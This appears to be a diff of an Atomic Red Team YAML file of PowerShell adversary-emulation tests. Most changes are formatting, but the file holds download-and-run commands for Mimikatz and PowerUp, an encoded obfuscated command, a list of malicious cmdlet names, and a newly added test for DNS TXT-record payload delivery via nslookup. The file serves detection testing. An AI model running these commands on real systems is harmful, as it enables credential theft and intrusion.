@@ -10,7 +10,7 @@ atomic_tests:
   input_arguments:
     mimurl:
       description: Mimikatz url
-      type: Url
+      type: url
       default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
     command: |
@@ -28,7 +28,7 @@ atomic_tests:
   input_arguments:
     file_path:
       description: File path for SharpHound payload
-      type: String
+      type: string
       default: PathToAtomicsFolder\T1059.001\src
   dependency_executor_name: powershell
   dependencies:
@@ -110,7 +110,7 @@ atomic_tests:
   input_arguments:
     url:
       description: url of payload to execute
-      type: Url
+      type: url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
   executor:
     command: |
@@ -127,7 +127,7 @@ atomic_tests:
   input_arguments:
     url:
       description: url of payload to execute
-      type: Url
+      type: url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
   executor:
     command: |
@@ -144,7 +144,7 @@ atomic_tests:
   input_arguments:
     url:
       description: url of payload to execute
-      type: Url
+      type: url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
   executor:
     command: |
@@ -206,7 +206,7 @@ atomic_tests:
   input_arguments:
     ads_file:
       description: File created to store Alternate Stream Data
-      type: String
+      type: string
       default: $env:TEMP\NTFS_ADS.txt
   dependencies:
   - description: |
@@ -229,19 +229,19 @@ atomic_tests:
   description: |
     Connect to a remote powershell session and interact with the host.
     Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
-  
+
   supported_platforms:
-    - windows
+  - windows
 
   input_arguments:
     hostname_to_connect:
       description: The host to connect to, by default it will connect to the local machine
-      type: String
+      type: string
       default: $env:COMPUTERNAME
 
   dependencies:
   - description: |
-       PSRemoting must be enabled
+      PSRemoting must be enabled
     prereq_command: |
       Try {
           New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
@@ -271,11 +271,11 @@ atomic_tests:
   input_arguments:
     command_line_switch_type:
       description: The type of supported command-line switch to use
-      type: String
+      type: string
       default: Hyphen
     command_param_variation:
       description: The "Command" parameter variation to use
-      type: String
+      type: string
       default: C
   dependencies:
   - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
@@ -297,15 +297,15 @@ atomic_tests:
   input_arguments:
     command_line_switch_type:
       description: The type of supported command-line switch to use
-      type: String
+      type: string
       default: Hyphen
     command_param_variation:
       description: The "Command" parameter variation to use
-      type: String
+      type: string
       default: C
     encoded_arguments_param_variation:
       description: The "EncodedArguments" parameter variation to use
-      type: String
+      type: string
       default: EA
   dependencies:
   - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
@@ -327,11 +327,11 @@ atomic_tests:
   input_arguments:
     command_line_switch_type:
       description: The type of supported command-line switch to use
-      type: String
+      type: string
       default: Hyphen
     encoded_command_param_variation:
       description: The "EncodedCommand" parameter variation to use
-      type: String
+      type: string
       default: E
   dependencies:
   - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
@@ -353,15 +353,15 @@ atomic_tests:
   input_arguments:
     encoded_command_param_variation:
       description: The "EncodedCommand" parameter variation to use
-      type: String
+      type: string
       default: E
     command_line_switch_type:
       description: The type of supported command-line switch to use
-      type: String
+      type: string
       default: Hyphen
     encoded_arguments_param_variation:
       description: The "EncodedArguments" parameter variation to use
-      type: String
+      type: string
       default: EncodedArguments
   dependencies:
   - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
@@ -384,7 +384,7 @@ atomic_tests:
   input_arguments:
     obfuscated_code:
       description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
-      type: String
+      type: string
       default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
   executor:
     command: |
@@ -398,8 +398,8 @@ atomic_tests:
   - windows
   input_arguments:
     Malicious_cmdlets:
-      description: Known Malicious Cmdlets 
-      type: String
+      description: Known Malicious Cmdlets
+      type: string
       default: |
         "Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"
   executor:
@@ -423,4 +423,20 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
       Invoke-AllChecks
+    name: powershell
+
+
+- name: Abuse Nslookup with DNS Records
+  auto_generated_guid: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1
+  description: |
+    Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.
+    [reference](https://twitter.com/jstrosch/status/1237382986557001729)
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      # creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
+      # this would not be part of a real attack but helpful for this simulation
+      function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
+      powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
     name: powershell
